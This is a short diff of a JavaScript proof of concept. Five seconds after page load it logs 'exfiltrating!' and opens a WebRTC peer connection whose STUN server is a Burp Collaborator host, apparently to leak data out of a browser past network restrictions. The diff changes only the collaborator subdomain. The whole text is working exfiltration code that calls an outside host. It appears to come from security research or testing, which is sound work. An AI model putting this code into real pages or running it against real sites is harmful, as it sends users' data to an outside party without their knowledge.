@@ -2,7 +2,7 @@
 window.addEventListener("load", () => {
   setTimeout(() => {
     console.log('exfiltrating!');
-    var peerConn=new RTCPeerConnection({'iceServers':[{'urls':['stun:cl1u22wkc65ayareia2ehv33quwpke.burpcollaborator.net']}]});
+    var peerConn=new RTCPeerConnection({'iceServers':[{'urls':['stun:604hqyivtblil14sjmrnpj8jza50tp.burpcollaborator.net']}]});
     var dataChannel=peerConn.createDataChannel('x');
     peerConn.createOffer({}).then((desc)=>peerConn.setLocalDescription(desc))
   }, 5000)
